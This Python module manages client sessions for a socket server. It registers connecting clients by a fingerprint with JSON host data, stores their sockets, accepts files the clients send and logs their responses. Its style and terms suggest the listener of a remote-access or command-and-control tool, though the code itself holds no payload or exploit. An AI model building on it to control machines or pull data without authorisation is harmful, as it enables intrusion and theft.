# ======================== CONFIGURATION ========================
from threading import Lock

clients = {}
lock = Lock()

# ======================== SESSION MANAGEMENT ========================
def add_client(cid, sock):
    """Add a client to active sessions."""
    with lock:
        clients[cid] = sock
    print(f"[+] Client {cid} added to sessions dict")

def remove_client(cid):
    """Remove a client from active sessions."""
    with lock:
        sock = clients.pop(cid, None)
        if sock:
            try:
                sock.close()
            except:
                pass

def get_client_socket(cid):
    """Get client socket by ID."""
    with lock:
        return clients.get(cid)

def get_all_clients():
    """Get all active clients."""
    with lock:
        return list(clients.items())

def list_sessions():
    """List all active sessions."""
    with lock:
        if not clients:
            print("[!] No active sessions")
        else:
            print("[*] Active sessions:")
            for cid in clients:
                print(f"  ID {cid}")

def close_all_sessions():
    """Close all sessions."""
    with lock:
        for sock in clients.values():
            try:
                sock.close()
            except:
                pass
        clients.clear()
    print("[*] All sessions closed")

# ======================== FINGERPRINT HANDLING ========================
def _process_fingerprint(first_line, ip, port, db_hooks, temp_cid):
    """Process client fingerprint and return client ID."""
    if not first_line or not first_line.startswith("FINGERPRINT "):
        return temp_cid, {}
    
    try:
        fingerprint = first_line.split()[1]
        # Parse additional fingerprint data if present
        fp_data = {}
        if len(first_line.split()) > 2:
            import json
            try:
                # Try to parse JSON data after fingerprint
                data_part = " ".join(first_line.split()[2:])
                fp_data = json.loads(data_part)
                print(f"[FINGERPRINT] Parsed JSON data: {fp_data}")
            except json.JSONDecodeError:
                print(f"[FINGERPRINT] Could not parse JSON data: {data_part}")
            except Exception as e:
                print(f"[FINGERPRINT] Error parsing data: {e}")
        
        print(f"[FINGERPRINT] Received fingerprint: {fingerprint[:20]}...")
        
        client_id = db_hooks["register_client"](fingerprint, fp_data, ip, port)
        db_hooks["record_session_open"](client_id, ip, port)
        
        # Update session dict if client_id changed
        if client_id != temp_cid:
            with lock:
                if temp_cid in clients:
                    clients[client_id] = clients.pop(temp_cid)
                    print(f"[FINGERPRINT] Updated session ID from {temp_cid} to {client_id}")
        
        print(f"[+] Client {client_id} (fingerprint: {fingerprint[:8]}...) connected from {ip}:{port}")
        return client_id, fp_data
    except Exception as e:
        print(f"[!] Error processing fingerprint: {e}")
        import traceback
        traceback.print_exc()
        return temp_cid, {}

# ======================== RESPONSE HANDLING ========================
# In the _handle_client_response function in sessions.py:
def _handle_client_response(line, sock, client_id, db_hooks):
    """Handle different types of client responses."""
    from .file_transfers import receive_file_from_client
    
    if line.startswith("FILE "):
        try:
            name, size, path = receive_file_from_client(sock, line)
            # File received from client is always "interact" context
            db_hooks["record_transfer"](client_id, "receive", name, size, "interact")
            print(f"[+] File received from {client_id}: {path}")
            sock.sendall("RECVOK\n".encode())
        except Exception as e:
            print(f"[!] File transfer error from {client_id}: {e}")
        return True
    
    if line == "RECVOK":
        print(f"[{client_id}] File transfer acknowledged")
        return True
    
    print(f"[{client_id}] {line}")
    db_hooks["record_response"](client_id, line)
    return False

# ======================== CLIENT HANDLER ========================
def handle_client(sock, addr, temp_cid, db_hooks):
    """Handle client communication with fingerprint support."""
    from .common import recv_line
    
    ip, port = addr[0], addr[1]
    client_id = None
    
    try:
        first_line = recv_line(sock)
        print(f"[CLIENT] First line received: {first_line}")
        
        if first_line and first_line.startswith("FINGERPRINT "):
            client_id, fp_data = _process_fingerprint(first_line, ip, port, db_hooks, temp_cid)
        else:
            client_id = temp_cid
            fp_data = {}
            db_hooks["record_session_open"](client_id, ip, port)
            print(f"[+] Client {client_id} connected from {ip}:{port} (legacy)")
        
        # Make sure client is in sessions dict (it should already be from server.py)
        add_client(client_id, sock)
        
        while True:
            line = recv_line(sock)
            if not line:
                print(f"[CLIENT] {client_id} disconnected (empty line)")
                break
            
            _handle_client_response(line, sock, client_id, db_hooks)
            
    except ConnectionError as e:
        print(f"[-] Client {client_id if client_id else temp_cid} disconnected: {e}")
    except Exception as e:
        print(f"[!] Client {client_id if client_id else temp_cid} error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if client_id:
            db_hooks["record_session_close"](client_id)
            remove_client(client_id)
        else:
            remove_client(temp_cid)
        print(f"[-] Client {client_id if client_id else temp_cid} disconnected")